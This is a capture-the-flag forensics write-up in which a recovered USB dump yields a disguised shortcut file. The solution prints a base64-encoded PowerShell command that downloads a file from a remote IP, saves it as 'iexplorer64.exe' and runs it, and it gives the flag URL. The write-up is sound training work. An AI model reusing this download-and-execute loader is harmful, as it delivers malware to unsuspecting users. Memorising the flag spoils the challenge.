![](./assets/images/logo.webp)



        
            
# where all problem starts 1



## Challenge Author(s):
Worty

## Description:
For a change of pace, a company has been attacked again... Nevertheless
, the means used here is quite original, indeed, it would be apparently
a food delivery man who would be at the origin of the initial 
compromise... For your first analysis, you will have to found what
the USB key that the delivery man put in the computer contains.

Could you provide us the malicious URL used to download something ?

## Objective:
Analyze the USB key dump and then find the malicious URL. 


## Flag:
`Hero{http://146.59.156.82/img.png}`
# 

# Solution

The strategy is:
- obtain deleted files from the dump
- extract these files
- decode base64 string to read the flag

<code>

    fls usb.dump
    icat usb.dump 5 > Important_Document.lnk
    echo YwBkACAAQwA6AFwAVQBzAGUAcgBzAFwAVwBvAHIAdAB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXAAgADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvADEANAA2AC4ANQA5AC4AMQA1ADYALgA4ADIALwBpAG0AZwAuAHAAbgBnACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlACIAIAA7ACAALgBcAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlAA== | base64 -d

</code>